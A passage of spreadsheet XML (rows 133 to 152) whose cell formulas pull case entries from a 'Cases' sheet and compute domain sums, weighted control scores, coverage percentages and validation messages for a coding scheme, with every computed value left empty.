      <c r="D133" s="11">
        <f>IF(Cases!F133="",LEFT(Cases!G133,120),Cases!F133)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E133:L133)=0,"",SUM(E133:L133))</f>
        <v/>
      </c>
      <c r="AJ133" s="13">
        <f>IF(AI133="","",N(E133)*3+N(F133)*2+N(G133)*2+N(H133)*2+N(I133)*2+N(J133)*3+N(K133)*3+N(L133)*3)</f>
        <v/>
      </c>
      <c r="AK133" s="13">
        <f>IF(AI133="","",COUNTIF(N133:AG133,1))</f>
        <v/>
      </c>
      <c r="AL133" s="13">
        <f>IF(OR(AJ133="",AJ133=0),"",ROUND(100*(AJ133-AK133)/AJ133,1))</f>
        <v/>
      </c>
      <c r="AM133" s="11">
        <f>IF(AI133="","",IF(AI133=0,"No domain coded 1; ","")&amp;IF(M133="","Primary domain missing; ",IF(IFERROR(INDEX(E133:L133,1,M133),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N133:AG133)&lt;&gt;AJ133,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH133="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN133" s="13">
        <f>IF(AND(AI133&lt;&gt;"",AM133=""),1,0)</f>
        <v/>
      </c>
      <c r="AO133" s="14" t="n"/>
    </row>
    <row r="134">
      <c r="A134" s="11">
        <f>Cases!A134</f>
        <v/>
      </c>
      <c r="B134" s="11">
        <f>Cases!B134</f>
        <v/>
      </c>
      <c r="C134" s="11">
        <f>Cases!C134</f>
        <v/>
      </c>
      <c r="D134" s="11">
        <f>IF(Cases!F134="",LEFT(Cases!G134,120),Cases!F134)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E134:L134)=0,"",SUM(E134:L134))</f>
        <v/>
      </c>
      <c r="AJ134" s="13">
        <f>IF(AI134="","",N(E134)*3+N(F134)*2+N(G134)*2+N(H134)*2+N(I134)*2+N(J134)*3+N(K134)*3+N(L134)*3)</f>
        <v/>
      </c>
      <c r="AK134" s="13">
        <f>IF(AI134="","",COUNTIF(N134:AG134,1))</f>
        <v/>
      </c>
      <c r="AL134" s="13">
        <f>IF(OR(AJ134="",AJ134=0),"",ROUND(100*(AJ134-AK134)/AJ134,1))</f>
        <v/>
      </c>
      <c r="AM134" s="11">
        <f>IF(AI134="","",IF(AI134=0,"No domain coded 1; ","")&amp;IF(M134="","Primary domain missing; ",IF(IFERROR(INDEX(E134:L134,1,M134),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N134:AG134)&lt;&gt;AJ134,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH134="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN134" s="13">
        <f>IF(AND(AI134&lt;&gt;"",AM134=""),1,0)</f>
        <v/>
      </c>
      <c r="AO134" s="14" t="n"/>
    </row>
    <row r="135">
      <c r="A135" s="11">
        <f>Cases!A135</f>
        <v/>
      </c>
      <c r="B135" s="11">
        <f>Cases!B135</f>
        <v/>
      </c>
      <c r="C135" s="11">
        <f>Cases!C135</f>
        <v/>
      </c>
      <c r="D135" s="11">
        <f>IF(Cases!F135="",LEFT(Cases!G135,120),Cases!F135)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E135:L135)=0,"",SUM(E135:L135))</f>
        <v/>
      </c>
      <c r="AJ135" s="13">
        <f>IF(AI135="","",N(E135)*3+N(F135)*2+N(G135)*2+N(H135)*2+N(I135)*2+N(J135)*3+N(K135)*3+N(L135)*3)</f>
        <v/>
      </c>
      <c r="AK135" s="13">
        <f>IF(AI135="","",COUNTIF(N135:AG135,1))</f>
        <v/>
      </c>
      <c r="AL135" s="13">
        <f>IF(OR(AJ135="",AJ135=0),"",ROUND(100*(AJ135-AK135)/AJ135,1))</f>
        <v/>
      </c>
      <c r="AM135" s="11">
        <f>IF(AI135="","",IF(AI135=0,"No domain coded 1; ","")&amp;IF(M135="","Primary domain missing; ",IF(IFERROR(INDEX(E135:L135,1,M135),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N135:AG135)&lt;&gt;AJ135,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH135="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN135" s="13">
        <f>IF(AND(AI135&lt;&gt;"",AM135=""),1,0)</f>
        <v/>
      </c>
      <c r="AO135" s="14" t="n"/>
    </row>
    <row r="136">
      <c r="A136" s="11">
        <f>Cases!A136</f>
        <v/>
      </c>
      <c r="B136" s="11">
        <f>Cases!B136</f>
        <v/>
      </c>
      <c r="C136" s="11">
        <f>Cases!C136</f>
        <v/>
      </c>
      <c r="D136" s="11">
        <f>IF(Cases!F136="",LEFT(Cases!G136,120),Cases!F136)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E136:L136)=0,"",SUM(E136:L136))</f>
        <v/>
      </c>
      <c r="AJ136" s="13">
        <f>IF(AI136="","",N(E136)*3+N(F136)*2+N(G136)*2+N(H136)*2+N(I136)*2+N(J136)*3+N(K136)*3+N(L136)*3)</f>
        <v/>
      </c>
      <c r="AK136" s="13">
        <f>IF(AI136="","",COUNTIF(N136:AG136,1))</f>
        <v/>
      </c>
      <c r="AL136" s="13">
        <f>IF(OR(AJ136="",AJ136=0),"",ROUND(100*(AJ136-AK136)/AJ136,1))</f>
        <v/>
      </c>
      <c r="AM136" s="11">
        <f>IF(AI136="","",IF(AI136=0,"No domain coded 1; ","")&amp;IF(M136="","Primary domain missing; ",IF(IFERROR(INDEX(E136:L136,1,M136),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N136:AG136)&lt;&gt;AJ136,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH136="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN136" s="13">
        <f>IF(AND(AI136&lt;&gt;"",AM136=""),1,0)</f>
        <v/>
      </c>
      <c r="AO136" s="14" t="n"/>
    </row>
    <row r="137">
      <c r="A137" s="11">
        <f>Cases!A137</f>
        <v/>
      </c>
      <c r="B137" s="11">
        <f>Cases!B137</f>
        <v/>
      </c>
      <c r="C137" s="11">
        <f>Cases!C137</f>
        <v/>
      </c>
      <c r="D137" s="11">
        <f>IF(Cases!F137="",LEFT(Cases!G137,120),Cases!F137)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E137:L137)=0,"",SUM(E137:L137))</f>
        <v/>
      </c>
      <c r="AJ137" s="13">
        <f>IF(AI137="","",N(E137)*3+N(F137)*2+N(G137)*2+N(H137)*2+N(I137)*2+N(J137)*3+N(K137)*3+N(L137)*3)</f>
        <v/>
      </c>
      <c r="AK137" s="13">
        <f>IF(AI137="","",COUNTIF(N137:AG137,1))</f>
        <v/>
      </c>
      <c r="AL137" s="13">
        <f>IF(OR(AJ137="",AJ137=0),"",ROUND(100*(AJ137-AK137)/AJ137,1))</f>
        <v/>
      </c>
      <c r="AM137" s="11">
        <f>IF(AI137="","",IF(AI137=0,"No domain coded 1; ","")&amp;IF(M137="","Primary domain missing; ",IF(IFERROR(INDEX(E137:L137,1,M137),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N137:AG137)&lt;&gt;AJ137,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH137="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN137" s="13">
        <f>IF(AND(AI137&lt;&gt;"",AM137=""),1,0)</f>
        <v/>
      </c>
      <c r="AO137" s="14" t="n"/>
    </row>
    <row r="138">
      <c r="A138" s="11">
        <f>Cases!A138</f>
        <v/>
      </c>
      <c r="B138" s="11">
        <f>Cases!B138</f>
        <v/>
      </c>
      <c r="C138" s="11">
        <f>Cases!C138</f>
        <v/>
      </c>
      <c r="D138" s="11">
        <f>IF(Cases!F138="",LEFT(Cases!G138,120),Cases!F138)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E138:L138)=0,"",SUM(E138:L138))</f>
        <v/>
      </c>
      <c r="AJ138" s="13">
        <f>IF(AI138="","",N(E138)*3+N(F138)*2+N(G138)*2+N(H138)*2+N(I138)*2+N(J138)*3+N(K138)*3+N(L138)*3)</f>
        <v/>
      </c>
      <c r="AK138" s="13">
        <f>IF(AI138="","",COUNTIF(N138:AG138,1))</f>
        <v/>
      </c>
      <c r="AL138" s="13">
        <f>IF(OR(AJ138="",AJ138=0),"",ROUND(100*(AJ138-AK138)/AJ138,1))</f>
        <v/>
      </c>
      <c r="AM138" s="11">
        <f>IF(AI138="","",IF(AI138=0,"No domain coded 1; ","")&amp;IF(M138="","Primary domain missing; ",IF(IFERROR(INDEX(E138:L138,1,M138),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N138:AG138)&lt;&gt;AJ138,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH138="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN138" s="13">
        <f>IF(AND(AI138&lt;&gt;"",AM138=""),1,0)</f>
        <v/>
      </c>
      <c r="AO138" s="14" t="n"/>
    </row>
    <row r="139">
      <c r="A139" s="11">
        <f>Cases!A139</f>
        <v/>
      </c>
      <c r="B139" s="11">
        <f>Cases!B139</f>
        <v/>
      </c>
      <c r="C139" s="11">
        <f>Cases!C139</f>
        <v/>
      </c>
      <c r="D139" s="11">
        <f>IF(Cases!F139="",LEFT(Cases!G139,120),Cases!F139)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E139:L139)=0,"",SUM(E139:L139))</f>
        <v/>
      </c>
      <c r="AJ139" s="13">
        <f>IF(AI139="","",N(E139)*3+N(F139)*2+N(G139)*2+N(H139)*2+N(I139)*2+N(J139)*3+N(K139)*3+N(L139)*3)</f>
        <v/>
      </c>
      <c r="AK139" s="13">
        <f>IF(AI139="","",COUNTIF(N139:AG139,1))</f>
        <v/>
      </c>
      <c r="AL139" s="13">
        <f>IF(OR(AJ139="",AJ139=0),"",ROUND(100*(AJ139-AK139)/AJ139,1))</f>
        <v/>
      </c>
      <c r="AM139" s="11">
        <f>IF(AI139="","",IF(AI139=0,"No domain coded 1; ","")&amp;IF(M139="","Primary domain missing; ",IF(IFERROR(INDEX(E139:L139,1,M139),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N139:AG139)&lt;&gt;AJ139,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH139="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN139" s="13">
        <f>IF(AND(AI139&lt;&gt;"",AM139=""),1,0)</f>
        <v/>
      </c>
      <c r="AO139" s="14" t="n"/>
    </row>
    <row r="140">
      <c r="A140" s="11">
        <f>Cases!A140</f>
        <v/>
      </c>
      <c r="B140" s="11">
        <f>Cases!B140</f>
        <v/>
      </c>
      <c r="C140" s="11">
        <f>Cases!C140</f>
        <v/>
      </c>
      <c r="D140" s="11">
        <f>IF(Cases!F140="",LEFT(Cases!G140,120),Cases!F140)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E140:L140)=0,"",SUM(E140:L140))</f>
        <v/>
      </c>
      <c r="AJ140" s="13">
        <f>IF(AI140="","",N(E140)*3+N(F140)*2+N(G140)*2+N(H140)*2+N(I140)*2+N(J140)*3+N(K140)*3+N(L140)*3)</f>
        <v/>
      </c>
      <c r="AK140" s="13">
        <f>IF(AI140="","",COUNTIF(N140:AG140,1))</f>
        <v/>
      </c>
      <c r="AL140" s="13">
        <f>IF(OR(AJ140="",AJ140=0),"",ROUND(100*(AJ140-AK140)/AJ140,1))</f>
        <v/>
      </c>
      <c r="AM140" s="11">
        <f>IF(AI140="","",IF(AI140=0,"No domain coded 1; ","")&amp;IF(M140="","Primary domain missing; ",IF(IFERROR(INDEX(E140:L140,1,M140),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N140:AG140)&lt;&gt;AJ140,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH140="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN140" s="13">
        <f>IF(AND(AI140&lt;&gt;"",AM140=""),1,0)</f>
        <v/>
      </c>
      <c r="AO140" s="14" t="n"/>
    </row>
    <row r="141">
      <c r="A141" s="11">
        <f>Cases!A141</f>
        <v/>
      </c>
      <c r="B141" s="11">
        <f>Cases!B141</f>
        <v/>
      </c>
      <c r="C141" s="11">
        <f>Cases!C141</f>
        <v/>
      </c>
      <c r="D141" s="11">
        <f>IF(Cases!F141="",LEFT(Cases!G141,120),Cases!F141)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E141:L141)=0,"",SUM(E141:L141))</f>
        <v/>
      </c>
      <c r="AJ141" s="13">
        <f>IF(AI141="","",N(E141)*3+N(F141)*2+N(G141)*2+N(H141)*2+N(I141)*2+N(J141)*3+N(K141)*3+N(L141)*3)</f>
        <v/>
      </c>
      <c r="AK141" s="13">
        <f>IF(AI141="","",COUNTIF(N141:AG141,1))</f>
        <v/>
      </c>
      <c r="AL141" s="13">
        <f>IF(OR(AJ141="",AJ141=0),"",ROUND(100*(AJ141-AK141)/AJ141,1))</f>
        <v/>
      </c>
      <c r="AM141" s="11">
        <f>IF(AI141="","",IF(AI141=0,"No domain coded 1; ","")&amp;IF(M141="","Primary domain missing; ",IF(IFERROR(INDEX(E141:L141,1,M141),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N141:AG141)&lt;&gt;AJ141,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH141="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN141" s="13">
        <f>IF(AND(AI141&lt;&gt;"",AM141=""),1,0)</f>
        <v/>
      </c>
      <c r="AO141" s="14" t="n"/>
    </row>
    <row r="142">
      <c r="A142" s="11">
        <f>Cases!A142</f>
        <v/>
      </c>
      <c r="B142" s="11">
        <f>Cases!B142</f>
        <v/>
      </c>
      <c r="C142" s="11">
        <f>Cases!C142</f>
        <v/>
      </c>
      <c r="D142" s="11">
        <f>IF(Cases!F142="",LEFT(Cases!G142,120),Cases!F142)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E142:L142)=0,"",SUM(E142:L142))</f>
        <v/>
      </c>
      <c r="AJ142" s="13">
        <f>IF(AI142="","",N(E142)*3+N(F142)*2+N(G142)*2+N(H142)*2+N(I142)*2+N(J142)*3+N(K142)*3+N(L142)*3)</f>
        <v/>
      </c>
      <c r="AK142" s="13">
        <f>IF(AI142="","",COUNTIF(N142:AG142,1))</f>
        <v/>
      </c>
      <c r="AL142" s="13">
        <f>IF(OR(AJ142="",AJ142=0),"",ROUND(100*(AJ142-AK142)/AJ142,1))</f>
        <v/>
      </c>
      <c r="AM142" s="11">
        <f>IF(AI142="","",IF(AI142=0,"No domain coded 1; ","")&amp;IF(M142="","Primary domain missing; ",IF(IFERROR(INDEX(E142:L142,1,M142),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N142:AG142)&lt;&gt;AJ142,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH142="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN142" s="13">
        <f>IF(AND(AI142&lt;&gt;"",AM142=""),1,0)</f>
        <v/>
      </c>
      <c r="AO142" s="14" t="n"/>
    </row>
    <row r="143">
      <c r="A143" s="11">
        <f>Cases!A143</f>
        <v/>
      </c>
      <c r="B143" s="11">
        <f>Cases!B143</f>
        <v/>
      </c>
      <c r="C143" s="11">
        <f>Cases!C143</f>
        <v/>
      </c>
      <c r="D143" s="11">
        <f>IF(Cases!F143="",LEFT(Cases!G143,120),Cases!F143)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E143:L143)=0,"",SUM(E143:L143))</f>
        <v/>
      </c>
      <c r="AJ143" s="13">
        <f>IF(AI143="","",N(E143)*3+N(F143)*2+N(G143)*2+N(H143)*2+N(I143)*2+N(J143)*3+N(K143)*3+N(L143)*3)</f>
        <v/>
      </c>
      <c r="AK143" s="13">
        <f>IF(AI143="","",COUNTIF(N143:AG143,1))</f>
        <v/>
      </c>
      <c r="AL143" s="13">
        <f>IF(OR(AJ143="",AJ143=0),"",ROUND(100*(AJ143-AK143)/AJ143,1))</f>
        <v/>
      </c>
      <c r="AM143" s="11">
        <f>IF(AI143="","",IF(AI143=0,"No domain coded 1; ","")&amp;IF(M143="","Primary domain missing; ",IF(IFERROR(INDEX(E143:L143,1,M143),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N143:AG143)&lt;&gt;AJ143,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH143="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN143" s="13">
        <f>IF(AND(AI143&lt;&gt;"",AM143=""),1,0)</f>
        <v/>
      </c>
      <c r="AO143" s="14" t="n"/>
    </row>
    <row r="144">
      <c r="A144" s="11">
        <f>Cases!A144</f>
        <v/>
      </c>
      <c r="B144" s="11">
        <f>Cases!B144</f>
        <v/>
      </c>
      <c r="C144" s="11">
        <f>Cases!C144</f>
        <v/>
      </c>
      <c r="D144" s="11">
        <f>IF(Cases!F144="",LEFT(Cases!G144,120),Cases!F144)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E144:L144)=0,"",SUM(E144:L144))</f>
        <v/>
      </c>
      <c r="AJ144" s="13">
        <f>IF(AI144="","",N(E144)*3+N(F144)*2+N(G144)*2+N(H144)*2+N(I144)*2+N(J144)*3+N(K144)*3+N(L144)*3)</f>
        <v/>
      </c>
      <c r="AK144" s="13">
        <f>IF(AI144="","",COUNTIF(N144:AG144,1))</f>
        <v/>
      </c>
      <c r="AL144" s="13">
        <f>IF(OR(AJ144="",AJ144=0),"",ROUND(100*(AJ144-AK144)/AJ144,1))</f>
        <v/>
      </c>
      <c r="AM144" s="11">
        <f>IF(AI144="","",IF(AI144=0,"No domain coded 1; ","")&amp;IF(M144="","Primary domain missing; ",IF(IFERROR(INDEX(E144:L144,1,M144),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N144:AG144)&lt;&gt;AJ144,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH144="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN144" s="13">
        <f>IF(AND(AI144&lt;&gt;"",AM144=""),1,0)</f>
        <v/>
      </c>
      <c r="AO144" s="14" t="n"/>
    </row>
    <row r="145">
      <c r="A145" s="11">
        <f>Cases!A145</f>
        <v/>
      </c>
      <c r="B145" s="11">
        <f>Cases!B145</f>
        <v/>
      </c>
      <c r="C145" s="11">
        <f>Cases!C145</f>
        <v/>
      </c>
      <c r="D145" s="11">
        <f>IF(Cases!F145="",LEFT(Cases!G145,120),Cases!F145)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E145:L145)=0,"",SUM(E145:L145))</f>
        <v/>
      </c>
      <c r="AJ145" s="13">
        <f>IF(AI145="","",N(E145)*3+N(F145)*2+N(G145)*2+N(H145)*2+N(I145)*2+N(J145)*3+N(K145)*3+N(L145)*3)</f>
        <v/>
      </c>
      <c r="AK145" s="13">
        <f>IF(AI145="","",COUNTIF(N145:AG145,1))</f>
        <v/>
      </c>
      <c r="AL145" s="13">
        <f>IF(OR(AJ145="",AJ145=0),"",ROUND(100*(AJ145-AK145)/AJ145,1))</f>
        <v/>
      </c>
      <c r="AM145" s="11">
        <f>IF(AI145="","",IF(AI145=0,"No domain coded 1; ","")&amp;IF(M145="","Primary domain missing; ",IF(IFERROR(INDEX(E145:L145,1,M145),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N145:AG145)&lt;&gt;AJ145,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH145="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN145" s="13">
        <f>IF(AND(AI145&lt;&gt;"",AM145=""),1,0)</f>
        <v/>
      </c>
      <c r="AO145" s="14" t="n"/>
    </row>
    <row r="146">
      <c r="A146" s="11">
        <f>Cases!A146</f>
        <v/>
      </c>
      <c r="B146" s="11">
        <f>Cases!B146</f>
        <v/>
      </c>
      <c r="C146" s="11">
        <f>Cases!C146</f>
        <v/>
      </c>
      <c r="D146" s="11">
        <f>IF(Cases!F146="",LEFT(Cases!G146,120),Cases!F146)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E146:L146)=0,"",SUM(E146:L146))</f>
        <v/>
      </c>
      <c r="AJ146" s="13">
        <f>IF(AI146="","",N(E146)*3+N(F146)*2+N(G146)*2+N(H146)*2+N(I146)*2+N(J146)*3+N(K146)*3+N(L146)*3)</f>
        <v/>
      </c>
      <c r="AK146" s="13">
        <f>IF(AI146="","",COUNTIF(N146:AG146,1))</f>
        <v/>
      </c>
      <c r="AL146" s="13">
        <f>IF(OR(AJ146="",AJ146=0),"",ROUND(100*(AJ146-AK146)/AJ146,1))</f>
        <v/>
      </c>
      <c r="AM146" s="11">
        <f>IF(AI146="","",IF(AI146=0,"No domain coded 1; ","")&amp;IF(M146="","Primary domain missing; ",IF(IFERROR(INDEX(E146:L146,1,M146),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N146:AG146)&lt;&gt;AJ146,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH146="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN146" s="13">
        <f>IF(AND(AI146&lt;&gt;"",AM146=""),1,0)</f>
        <v/>
      </c>
      <c r="AO146" s="14" t="n"/>
    </row>
    <row r="147">
      <c r="A147" s="11">
        <f>Cases!A147</f>
        <v/>
      </c>
      <c r="B147" s="11">
        <f>Cases!B147</f>
        <v/>
      </c>
      <c r="C147" s="11">
        <f>Cases!C147</f>
        <v/>
      </c>
      <c r="D147" s="11">
        <f>IF(Cases!F147="",LEFT(Cases!G147,120),Cases!F147)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E147:L147)=0,"",SUM(E147:L147))</f>
        <v/>
      </c>
      <c r="AJ147" s="13">
        <f>IF(AI147="","",N(E147)*3+N(F147)*2+N(G147)*2+N(H147)*2+N(I147)*2+N(J147)*3+N(K147)*3+N(L147)*3)</f>
        <v/>
      </c>
      <c r="AK147" s="13">
        <f>IF(AI147="","",COUNTIF(N147:AG147,1))</f>
        <v/>
      </c>
      <c r="AL147" s="13">
        <f>IF(OR(AJ147="",AJ147=0),"",ROUND(100*(AJ147-AK147)/AJ147,1))</f>
        <v/>
      </c>
      <c r="AM147" s="11">
        <f>IF(AI147="","",IF(AI147=0,"No domain coded 1; ","")&amp;IF(M147="","Primary domain missing; ",IF(IFERROR(INDEX(E147:L147,1,M147),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N147:AG147)&lt;&gt;AJ147,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH147="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN147" s="13">
        <f>IF(AND(AI147&lt;&gt;"",AM147=""),1,0)</f>
        <v/>
      </c>
      <c r="AO147" s="14" t="n"/>
    </row>
    <row r="148">
      <c r="A148" s="11">
        <f>Cases!A148</f>
        <v/>
      </c>
      <c r="B148" s="11">
        <f>Cases!B148</f>
        <v/>
      </c>
      <c r="C148" s="11">
        <f>Cases!C148</f>
        <v/>
      </c>
      <c r="D148" s="11">
        <f>IF(Cases!F148="",LEFT(Cases!G148,120),Cases!F148)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E148:L148)=0,"",SUM(E148:L148))</f>
        <v/>
      </c>
      <c r="AJ148" s="13">
        <f>IF(AI148="","",N(E148)*3+N(F148)*2+N(G148)*2+N(H148)*2+N(I148)*2+N(J148)*3+N(K148)*3+N(L148)*3)</f>
        <v/>
      </c>
      <c r="AK148" s="13">
        <f>IF(AI148="","",COUNTIF(N148:AG148,1))</f>
        <v/>
      </c>
      <c r="AL148" s="13">
        <f>IF(OR(AJ148="",AJ148=0),"",ROUND(100*(AJ148-AK148)/AJ148,1))</f>
        <v/>
      </c>
      <c r="AM148" s="11">
        <f>IF(AI148="","",IF(AI148=0,"No domain coded 1; ","")&amp;IF(M148="","Primary domain missing; ",IF(IFERROR(INDEX(E148:L148,1,M148),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N148:AG148)&lt;&gt;AJ148,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH148="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN148" s="13">
        <f>IF(AND(AI148&lt;&gt;"",AM148=""),1,0)</f>
        <v/>
      </c>
      <c r="AO148" s="14" t="n"/>
    </row>
    <row r="149">
      <c r="A149" s="11">
        <f>Cases!A149</f>
        <v/>
      </c>
      <c r="B149" s="11">
        <f>Cases!B149</f>
        <v/>
      </c>
      <c r="C149" s="11">
        <f>Cases!C149</f>
        <v/>
      </c>
      <c r="D149" s="11">
        <f>IF(Cases!F149="",LEFT(Cases!G149,120),Cases!F149)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E149:L149)=0,"",SUM(E149:L149))</f>
        <v/>
      </c>
      <c r="AJ149" s="13">
        <f>IF(AI149="","",N(E149)*3+N(F149)*2+N(G149)*2+N(H149)*2+N(I149)*2+N(J149)*3+N(K149)*3+N(L149)*3)</f>
        <v/>
      </c>
      <c r="AK149" s="13">
        <f>IF(AI149="","",COUNTIF(N149:AG149,1))</f>
        <v/>
      </c>
      <c r="AL149" s="13">
        <f>IF(OR(AJ149="",AJ149=0),"",ROUND(100*(AJ149-AK149)/AJ149,1))</f>
        <v/>
      </c>
      <c r="AM149" s="11">
        <f>IF(AI149="","",IF(AI149=0,"No domain coded 1; ","")&amp;IF(M149="","Primary domain missing; ",IF(IFERROR(INDEX(E149:L149,1,M149),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N149:AG149)&lt;&gt;AJ149,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH149="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN149" s="13">
        <f>IF(AND(AI149&lt;&gt;"",AM149=""),1,0)</f>
        <v/>
      </c>
      <c r="AO149" s="14" t="n"/>
    </row>
    <row r="150">
      <c r="A150" s="11">
        <f>Cases!A150</f>
        <v/>
      </c>
      <c r="B150" s="11">
        <f>Cases!B150</f>
        <v/>
      </c>
      <c r="C150" s="11">
        <f>Cases!C150</f>
        <v/>
      </c>
      <c r="D150" s="11">
        <f>IF(Cases!F150="",LEFT(Cases!G150,120),Cases!F150)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E150:L150)=0,"",SUM(E150:L150))</f>
        <v/>
      </c>
      <c r="AJ150" s="13">
        <f>IF(AI150="","",N(E150)*3+N(F150)*2+N(G150)*2+N(H150)*2+N(I150)*2+N(J150)*3+N(K150)*3+N(L150)*3)</f>
        <v/>
      </c>
      <c r="AK150" s="13">
        <f>IF(AI150="","",COUNTIF(N150:AG150,1))</f>
        <v/>
      </c>
      <c r="AL150" s="13">
        <f>IF(OR(AJ150="",AJ150=0),"",ROUND(100*(AJ150-AK150)/AJ150,1))</f>
        <v/>
      </c>
      <c r="AM150" s="11">
        <f>IF(AI150="","",IF(AI150=0,"No domain coded 1; ","")&amp;IF(M150="","Primary domain missing; ",IF(IFERROR(INDEX(E150:L150,1,M150),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N150:AG150)&lt;&gt;AJ150,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH150="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN150" s="13">
        <f>IF(AND(AI150&lt;&gt;"",AM150=""),1,0)</f>
        <v/>
      </c>
      <c r="AO150" s="14" t="n"/>
    </row>
    <row r="151">
      <c r="A151" s="11">
        <f>Cases!A151</f>
        <v/>
      </c>
      <c r="B151" s="11">
        <f>Cases!B151</f>
        <v/>
      </c>
      <c r="C151" s="11">
        <f>Cases!C151</f>
        <v/>
      </c>
      <c r="D151" s="11">
        <f>IF(Cases!F151="",LEFT(Cases!G151,120),Cases!F151)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E151:L151)=0,"",SUM(E151:L151))</f>
        <v/>
      </c>
      <c r="AJ151" s="13">
        <f>IF(AI151="","",N(E151)*3+N(F151)*2+N(G151)*2+N(H151)*2+N(I151)*2+N(J151)*3+N(K151)*3+N(L151)*3)</f>
        <v/>
      </c>
      <c r="AK151" s="13">
        <f>IF(AI151="","",COUNTIF(N151:AG151,1))</f>
        <v/>
      </c>
      <c r="AL151" s="13">
        <f>IF(OR(AJ151="",AJ151=0),"",ROUND(100*(AJ151-AK151)/AJ151,1))</f>
        <v/>
      </c>
      <c r="AM151" s="11">
        <f>IF(AI151="","",IF(AI151=0,"No domain coded 1; ","")&amp;IF(M151="","Primary domain missing; ",IF(IFERROR(INDEX(E151:L151,1,M151),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N151:AG151)&lt;&gt;AJ151,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH151="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN151" s="13">
        <f>IF(AND(AI151&lt;&gt;"",AM151=""),1,0)</f>
        <v/>
      </c>
      <c r="AO151" s="14" t="n"/>
    </row>
    <row r="152">
